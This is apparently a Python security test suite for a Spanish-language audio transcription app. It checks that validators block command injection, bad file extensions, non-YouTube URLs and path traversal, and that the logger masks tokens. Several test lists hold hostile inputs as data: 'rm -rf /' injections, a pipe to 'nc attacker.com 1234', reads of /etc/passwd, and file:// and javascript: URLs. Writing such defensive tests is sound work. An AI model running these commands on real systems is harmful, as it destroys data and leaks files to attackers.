"""
Tests de seguridad para DesktopWhisperTranscriber
Verifica las correcciones de vulnerabilidades implementadas.
"""

import os
import queue
import sys
import tempfile
import unittest
from pathlib import Path

# Añadir el directorio raíz del proyecto al PATH
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, project_root)

from src.core.exceptions import AudioProcessingError, SecurityError, ValidationError
from src.core.transcriber_engine import TranscriberEngine
from src.core.validators import InputValidator


class TestSecurityFixes(unittest.TestCase):
    """
    Pruebas de seguridad para verificar las correcciones de vulnerabilidades.
    """

    def setUp(self):
        """Configurar antes de cada prueba."""
        self.engine = TranscriberEngine()

    def test_ffmpeg_path_validation_blocks_dangerous_chars(self):
        """
        Verifica que FFmpeg rechaza rutas con caracteres peligrosos (inyección de comandos).

        CVE: Prevención de Command Injection en FFmpeg
        """
        dangerous_paths = [
            "; rm -rf /; audio.wav",
            "audio.wav && rm -rf /",
            "audio.wav | nc attacker.com 1234",
            "`whoami`.wav",
            "$(echo hacked).wav",
            "audio.wav; cat /etc/passwd",
        ]

        for dangerous_path in dangerous_paths:
            with self.subTest(path=dangerous_path):
                with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as tmp:
                    output_path = tmp.name

                try:
                    # SecurityError hereda de TranscriptorError, no de ValueError
                    # Esperamos SecurityError o ValueError para caracteres peligrosos
                    with self.assertRaises((ValueError, SecurityError)) as context:
                        self.engine._preprocess_audio_for_diarization(dangerous_path, output_path)

                    self.assertIn("Caracter peligroso detectado", str(context.exception))
                finally:
                    if os.path.exists(output_path):
                        os.remove(output_path)

    def test_ffmpeg_path_validation_allows_safe_paths(self):
        """
        Verifica que FFmpeg acepta rutas seguras normales.
        """
        safe_paths = [
            "audio.wav",
            "mi archivo.mp3",
            "c:\\users\\audio.wav",
            "/home/user/audio.mp3",
            "test_file_123.wav",
        ]

        # No ejecutamos FFmpeg real, solo verificamos que no lanza ValueError
        # por caracteres peligrosos (va a fallar por FFmpeg no encontrado, no por seguridad)
        for safe_path in safe_paths:
            with self.subTest(path=safe_path):
                with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as tmp:
                    output_path = tmp.name

                try:
                    # Verificar que no lanza ValueError por caracteres peligrosos
                    # (puede lanzar RuntimeError por FFmpeg no encontrado)
                    try:
                        self.engine._preprocess_audio_for_diarization(safe_path, output_path)
                    except (ValueError, SecurityError) as e:
                        if "Caracter peligroso detectado" in str(e):
                            self.fail(f"Ruta segura rechazada incorrectamente: {safe_path}")
                    except (RuntimeError, AudioProcessingError):
                        # FFmpeg no encontrado es aceptable para esta prueba
                        pass
                finally:
                    if os.path.exists(output_path):
                        os.remove(output_path)

    def test_ffmpeg_extension_validation(self):
        """
        Verifica que FFmpeg solo acepta extensiones de audio permitidas.
        """
        # Extensiones permitidas
        allowed_extensions = [
            ".wav",
            ".mp3",
            ".aac",
            ".flac",
            ".ogg",
            ".m4a",
            ".opus",
            ".wma",
        ]

        for ext in allowed_extensions:
            with self.subTest(extension=ext):
                # No debería lanzar error de extensión
                try:
                    with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as tmp:
                        output_path = tmp.name
                    input_path = f"test{ext}"

                    try:
                        self.engine._preprocess_audio_for_diarization(input_path, output_path)
                    except (ValueError, SecurityError) as e:
                        if "Extensión de archivo no permitida" in str(e):
                            self.fail(f"Extensión permitida rechazada: {ext}")
                    except (RuntimeError, AudioProcessingError):
                        pass  # FFmpeg no encontrado es aceptable
                finally:
                    if os.path.exists(output_path):
                        os.remove(output_path)

    def test_ffmpeg_rejects_invalid_extensions(self):
        """
        Verifica que FFmpeg rechaza extensiones no permitidas.
        """
        invalid_extensions = [".exe", ".sh", ".bat", ".cmd", ".py", ".js", ".php"]

        for ext in invalid_extensions:
            with self.subTest(extension=ext):
                with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as tmp:
                    output_path = tmp.name
                input_path = f"test{ext}"

                try:
                    # Esperamos ValueError o SecurityError para extensiones inválidas
                    with self.assertRaises((ValueError, SecurityError)) as context:
                        self.engine._preprocess_audio_for_diarization(input_path, output_path)

                    self.assertIn("Extensión de archivo no permitida", str(context.exception))
                finally:
                    if os.path.exists(output_path):
                        os.remove(output_path)

    def test_youtube_url_validation_valid_urls(self):
        """
        Verifica que URLs válidas de YouTube sean aceptadas.
        """
        valid_urls = [
            "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
            "https://youtu.be/dQw4w9WgXcQ",
            "https://www.youtube.com/shorts/abc123def45",
            "https://youtube.com/watch?v=dQw4w9WgXcQ&feature=share",
            "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "www.youtube.com/watch?v=dQw4w9WgXcQ",
            "youtube.com/watch?v=dQw4w9WgXcQ",
        ]

        for url in valid_urls:
            with self.subTest(url=url):
                self.assertTrue(InputValidator.validate_youtube_url(url), f"URL válida rechazada: {url}")

    def test_youtube_url_validation_invalid_urls(self):
        """
        Verifica que URLs inválidas o maliciosas sean rechazadas.

        Previene SSRF y ejecución de URLs no válidas.
        """
        invalid_urls = [
            "",  # Vacía
            "not-a-url",  # No es URL
            "https://evil.com/malware.exe",  # URL maliciosa
            "https://attacker.com/phishing",  # Dominio no permitido
            "file:///etc/passwd",  # File protocol (SSRF)
            "https://www.youtube.com/watch",  # Sin ID de video
            "https://www.youtube.com/",  # Sin path
            "javascript:alert('xss')",  # XSS
            "https://youtube.com/watch?v=",  # ID vacío
        ]

        for url in invalid_urls:
            with self.subTest(url=url):
                self.assertFalse(InputValidator.validate_youtube_url(url), f"URL inválida aceptada: {url}")

    def test_huggingface_token_masking(self):
        """
        Verifica que el token de Hugging Face se enmascare correctamente en logs.

        Seguridad: Nunca exponer tokens completos en logs.
        """
        # Simular un token largo
        token = "hf_1234567890abcdef1234567890abcdef1234567890"

        # Verificar enmascaramiento (primeros 4 + asteriscos + últimos 4)
        masked = token[:4] + "*" * (len(token) - 8) + token[-4:]

        # El token enmascarado debe ser más corto o igual que el original
        self.assertEqual(len(masked), len(token))
        # Debe contener asteriscos
        self.assertIn("*", masked)
        # No debe ser igual al token original
        self.assertNotEqual(masked, token)
        # Debe preservar primeros y últimos 4 caracteres
        self.assertEqual(masked[:4], token[:4])
        self.assertEqual(masked[-4:], token[-4:])

    def test_dependencies_updated(self):
        """
        Verifica que las dependencias vulnerables hayan sido actualizadas.
        """
        requirements_path = os.path.join(project_root, "requirements.txt")

        with open(requirements_path, "r") as f:
            requirements = f.read()

        # Verificar que yt-dlp esté actualizado (CVE-2025-54072)
        self.assertIn("yt-dlp>=2025.07.21", requirements)

        # Verificar que faster-whisper esté actualizado (CVE-2025-14569)
        self.assertIn("faster-whisper>=1.1.0", requirements)

        # Verificar que fpdf2 esté actualizado (AIKIDO-2025-10551)
        self.assertIn("fpdf2>=2.8.3", requirements)

        # Verificar que pytube haya sido eliminado o comentado
        # Buscar la línea descomentada (no debe existir)
        lines = requirements.split("\n")
        for line in lines:
            if "pytube>=15.0.0" in line and not line.strip().startswith("#"):
                self.fail(f"pytube descomentado encontrado: {line}")

        # Verificar que hay un comentario indicando que fue eliminado
        self.assertIn("# pytube>=15.0.0", requirements)

    def test_path_normalization_with_pathlib(self):
        """
        Verifica que se use Path.resolve() para normalizar rutas.

        Previene path traversal attacks.
        """
        # Crear una ruta con posible path traversal
        suspicious_path = "../../../etc/passwd.wav"

        # Path.resolve() debe normalizar la ruta
        normalized = Path(suspicious_path).resolve()

        # La ruta normalizada no debe contener ..
        self.assertNotIn("..", str(normalized))

    def test_ffmpeg_available_verification(self):
        """
        Verifica que exista la función de verificación de FFmpeg.
        """
        # Verificar que el método existe
        self.assertTrue(
            hasattr(self.engine, "_verify_ffmpeg_available"),
            "El método _verify_ffmpeg_available no existe",
        )

        # Verificar que es llamable
        self.assertTrue(
            callable(getattr(self.engine, "_verify_ffmpeg_available")),
            "El método _verify_ffmpeg_available no es llamable",
        )


class TestInputValidators(unittest.TestCase):
    """
    Pruebas para el módulo de validadores de entrada.
    """

    def setUp(self):
        """Configurar antes de cada prueba."""
        from src.core.validators import InputValidator, validator

        self.validator = validator
        self.InputValidator = InputValidator

    def test_file_size_validation_rejects_empty_file(self):
        """Verifica que se rechacen archivos vacíos."""
        with tempfile.NamedTemporaryFile(delete=False) as tmp:
            tmp_path = tmp.name

        try:
            # Archivo vacío (0 bytes)
            is_valid, error = self.validator.validate_file_size(tmp_path)
            self.assertFalse(is_valid)
            self.assertIn("vacío", error.lower())
        finally:
            os.remove(tmp_path)

    def test_file_size_validation_rejects_missing_file(self):
        """Verifica que se rechacen archivos inexistentes."""
        is_valid, error = self.validator.validate_file_size("/ruta/inexistente/archivo.wav")
        self.assertFalse(is_valid)
        self.assertIn("no existe", error.lower())

    def test_path_security_blocks_dangerous_chars(self):
        """Verifica que se bloqueen caracteres peligrosos en rutas."""
        dangerous_paths = [
            "; rm -rf /",
            "audio.wav && rm -rf /",
            "`whoami`",
            "$(echo hacked)",
            "test | nc attacker.com 1234",
        ]

        for path in dangerous_paths:
            with self.subTest(path=path):
                is_safe, error = self.validator.validate_path_security(path)
                self.assertFalse(is_safe, f"Ruta peligrosa no bloqueada: {path}")
                self.assertIn("peligroso", error.lower())

    def test_path_security_allows_safe_paths(self):
        """Verifica que se permitan rutas normales."""
        safe_paths = [
            "audio.wav",
            "mi archivo.mp3",
            "/home/user/música/audio.wav",
            "C:\\Users\\Test\\audio.mp3",
        ]

        for path in safe_paths:
            with self.subTest(path=path):
                is_safe, error = self.validator.validate_path_security(path)
                self.assertTrue(is_safe, f"Ruta segura rechazada: {path}")

    def test_audio_extension_validation(self):
        """Verifica validación de extensiones de audio."""
        # Extensiones permitidas
        allowed = [".wav", ".mp3", ".flac", ".ogg", ".m4a"]
        for ext in allowed:
            with self.subTest(extension=ext):
                is_valid, _ = self.validator.validate_audio_extension(f"test{ext}")
                self.assertTrue(is_valid, f"Extensión permitida rechazada: {ext}")

        # Extensiones bloqueadas
        blocked = [".exe", ".sh", ".bat", ".py", ".js"]
        for ext in blocked:
            with self.subTest(extension=ext):
                is_valid, error = self.validator.validate_audio_extension(f"test{ext}")
                self.assertFalse(is_valid, f"Extensión bloqueada aceptada: {ext}")

    def test_youtube_url_validation_via_validator(self):
        """Verifica validación de URLs de YouTube vía el módulo validator."""
        valid_urls = [
            "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
            "https://youtu.be/dQw4w9WgXcQ",
        ]

        for url in valid_urls:
            with self.subTest(url=url):
                self.assertTrue(
                    self.validator.validate_youtube_url(url), f"URL válida rechazada: {url}"
                )

        invalid_urls = [
            "file:///etc/passwd",
            "javascript:alert('xss')",
            "https://evil.com/malware",
        ]

        for url in invalid_urls:
            with self.subTest(url=url):
                self.assertFalse(
                    self.validator.validate_youtube_url(url), f"URL inválida aceptada: {url}"
                )

    def test_text_sanitization(self):
        """Verifica sanitización de texto para exportación."""
        # Texto con caracteres problemáticos
        text_with_special_chars = "Hello\u2026 \u201cWorld\u201d \u2014 Test\u2019s"
        sanitized = self.validator.sanitize_text_for_export(text_with_special_chars)

        # Verificar que no contiene caracteres Unicode problemáticos
        self.assertNotIn("\u2026", sanitized)
        self.assertNotIn("\u201c", sanitized)
        self.assertNotIn("\u201d", sanitized)
        self.assertNotIn("\u2014", sanitized)
        self.assertNotIn("\u2019", sanitized)

        # Verificar que contiene los reemplazos correctos
        self.assertIn("...", sanitized)
        self.assertIn('"', sanitized)
        self.assertIn("'", sanitized)

    def test_environment_token_validation(self):
        """Verifica validación de tokens de entorno."""
        # Token vacío
        is_valid, error = self.validator.validate_environment_token("")
        self.assertFalse(is_valid)

        # Token demasiado corto
        is_valid, error = self.validator.validate_environment_token("abc")
        self.assertFalse(is_valid)
        self.assertIn("corto", error.lower())

        # Token válido
        is_valid, _ = self.validator.validate_environment_token("hf_1234567890abcdef")
        self.assertTrue(is_valid)


class TestLoggerSanitization(unittest.TestCase):
    """
    Pruebas para la sanitización de datos sensibles en el logger.
    """

    def setUp(self):
        """Configurar antes de cada prueba."""
        from src.core.logger import TranscriptorLogger

        self.logger_class = TranscriptorLogger

    def test_token_sanitization_in_logs(self):
        """Verifica que tokens sensibles se enmascaren en logs."""
        # Crear una instancia del logger para probar el filtro
        from src.core.logger import SensitiveDataFilter

        sanitizer = SensitiveDataFilter()

        # Probar con diferentes patrones de tokens
        test_cases = [
            # Token HF sin prefijo "Token:" para evitar match con el patrón genérico
            ("Mi token de HF es hf_1234567890abcdef1234567890", "[HF_TOKEN_REDACTED]"),
            # Patrones con formato key=value
            ("password=mysecretpassword123", "[REDACTED]"),
            ("api_key=sk-1234567890abcdef", "[REDACTED]"),
            ("secret=verysecretvalue12345", "[REDACTED]"),
        ]

        for original, expected_pattern in test_cases:
            with self.subTest(original=original[:30]):
                # El filtro debe sanitizar el mensaje
                sanitized = sanitizer._sanitize(original)
                # El sanitizado debe contener el patrón de redacción
                self.assertIn(
                    expected_pattern, sanitized, f"Expected '{expected_pattern}' in '{sanitized}'"
                )


if __name__ == "__main__":
    unittest.main()
